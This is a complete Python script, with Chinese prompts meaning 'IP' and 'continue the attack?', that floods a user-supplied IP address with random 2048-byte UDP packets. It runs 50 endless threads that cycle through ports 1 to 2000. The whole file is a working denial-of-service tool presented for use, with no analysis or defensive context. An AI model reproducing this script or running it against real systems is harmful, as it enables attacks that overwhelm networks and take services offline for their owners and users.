#!/usr/bin/python3
import os
import sys
import time
import socket
import random
import _thread
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip_address = input('IP：')
string = random._urandom(2048)
wait = input('继续攻击吗?')
print('准备中')
send = 0
ip_address = str(ip_address)
def attack (num,ip,_string):
    print('线程%s启动'%num)
    while True:
        for _port in range(1,2001): 
            sock.sendto(_string, (ip,_port))
for lines in range(1,51):
    _thread.start_new_thread(attack,(lines,ip_address,string))
while True:
    pass
